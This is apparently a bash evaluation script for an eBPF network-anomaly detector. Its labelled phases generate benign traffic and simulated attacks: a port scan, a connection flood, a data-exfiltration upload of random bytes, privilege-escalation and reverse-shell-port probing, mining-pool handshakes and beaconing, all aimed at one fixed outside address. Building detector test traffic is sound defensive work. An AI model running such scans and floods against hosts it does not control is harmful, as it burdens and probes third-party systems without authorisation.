#!/usr/bin/env bash
# continuous_eval.sh — single long session: benign baseline then attacks
# Events are labelled by injection timestamp, not by separate runs.
set -euo pipefail

IFACE="${1:-ens3}"
BINARY="/home/ubuntu/ebpf-cla/ebpf-cla"
SIMDIR="/home/ubuntu/ebpf-cla/attack-sim"
OUTDIR="/home/ubuntu/ebpf-cla/results/raw"
CSV="$OUTDIR/continuous_$(date +%Y%m%d_%H%M%S).csv"
TIMELINE="$OUTDIR/continuous_timeline.txt"

echo "[eval] Continuous session → $CSV"
echo "[eval] Interface: $IFACE"

# Start detector (will accumulate stats across ALL phases)
# Initial label = benign; updated in real-time via restart-with-append
# Approach: restart ebpf-cla with new --label for each phase, appending to same CSV

run_phase() {
    local label="$1"
    local duration="$2"
    local traffic_cmd="$3"
    local ts; ts=$(date +%H:%M:%S)

    echo "$ts $label start" >> "$TIMELINE"
    echo "[eval] ── $label ($duration s) ──"

    sudo "$BINARY" "$IFACE" --csv "$CSV" --label "$label" \
        > "/tmp/cla_cont_${label}.log" 2>&1 &
    local cla_pid=$!
    sleep 2

    eval "$traffic_cmd" &
    local traffic_pid=$!

    sleep "$duration"

    kill "$traffic_pid" 2>/dev/null || true
    wait "$traffic_pid" 2>/dev/null || true
    sudo kill "$cla_pid" 2>/dev/null || true
    wait "$cla_pid" 2>/dev/null || true
    sleep 1

    # Count new rows
    local n; n=$(tail -n +2 "$CSV" 2>/dev/null | grep -c ",$label," || echo 0)
    echo "[eval]    $label: $n events"
    echo "$(date +%H:%M:%S) $label end ($n events)" >> "$TIMELINE"
}

# ── Phase 0: Long benign baseline ──────────────────────────────────────
echo "[eval] Building benign baseline (90 s)..."
run_phase "benign" 90 \
    "for i in \$(seq 1 120); do
         curl -s -o /dev/null http://example.com 2>/dev/null || true
         sleep 0.5
     done"

# ── Phase 1: Port Scan ──────────────────────────────────────────────────
run_phase "portscan" 40 \
    "python3 -c \"
import socket
for port in range(1, 1025):
    try:
        s=socket.socket(); s.settimeout(0.05)
        s.connect(('93.184.216.34', port)); s.close()
    except: pass
\""

# ── Phase 2: Benign cooldown ────────────────────────────────────────────
run_phase "benign" 20 \
    "for i in \$(seq 1 20); do curl -s -o /dev/null http://example.com 2>/dev/null || true; sleep 0.5; done"

# ── Phase 3: SYN Flood ──────────────────────────────────────────────────
run_phase "synflood" 30 \
    "python3 -c \"
import socket
for _ in range(400):
    try:
        s=socket.socket(); s.settimeout(0.05)
        s.connect(('93.184.216.34', 80)); s.close()
    except: pass
\""

# ── Phase 4: Benign cooldown ────────────────────────────────────────────
run_phase "benign" 20 \
    "for i in \$(seq 1 20); do curl -s -o /dev/null http://example.com 2>/dev/null || true; sleep 0.5; done"

# ── Phase 5: Exfiltration ───────────────────────────────────────────────
run_phase "exfil" 25 \
    "python3 -c \"
import socket, os, time
for _ in range(25):
    try:
        s=socket.socket(); s.settimeout(2.0)
        s.connect(('93.184.216.34', 80))
        s.sendall(b'POST / HTTP/1.0\r\nHost: x\r\nContent-Length: 16384\r\n\r\n' + os.urandom(4096))
        time.sleep(0.1); s.close()
    except: pass
\""

# ── Phase 6: Benign cooldown ────────────────────────────────────────────
run_phase "benign" 20 \
    "for i in \$(seq 1 20); do curl -s -o /dev/null http://example.com 2>/dev/null || true; sleep 0.5; done"

# ── Phase 7: Privesc simulation ─────────────────────────────────────────
run_phase "privesc" 25 \
    "python3 -c \"
import socket, subprocess
for i in range(60): subprocess.run(['id'], capture_output=True)
for port in [4444,1337,31337,9999,8888]*5:
    try:
        s=socket.socket(); s.settimeout(0.1)
        s.connect(('93.184.216.34', port)); s.close()
    except: pass
\""

# ── Phase 8: Cryptomining ───────────────────────────────────────────────
run_phase "cryptomining" 25 \
    "python3 -c \"
import socket, time
for cycle in range(10):
    for port in [3333,4444,14444,45700]:
        try:
            s=socket.socket(); s.settimeout(0.5)
            s.connect(('93.184.216.34', port))
            s.sendall(b'{\"method\":\"mining.subscribe\"}\n')
            time.sleep(0.05); s.close()
        except: pass
    time.sleep(0.2)
\""

# ── Phase 9: Rootkit beaconing ──────────────────────────────────────────
run_phase "rootkit" 30 \
    "python3 -c \"
import socket, time
for p in [7000,8000,9000,10000]:
    try: s=socket.socket(); s.settimeout(0.05); s.connect(('93.184.216.34',p)); s.close()
    except: pass
    time.sleep(0.05)
for _ in range(25):
    try: s=socket.socket(); s.settimeout(0.2); s.connect(('93.184.216.34',443)); s.close()
    except: pass
    time.sleep(0.3)
\""

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[eval] COMPLETE → $CSV"
TOTAL=$(tail -n +2 "$CSV" 2>/dev/null | wc -l || echo 0)
echo "[eval] Total events: $TOTAL"
python3 -c "
import csv
from collections import Counter
rows = list(csv.DictReader(open('$CSV')))
c = Counter(r['label'] for r in rows)
for k,v in sorted(c.items()): print(f'  {k}: {v}')
" 2>/dev/null || true
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "$CSV"
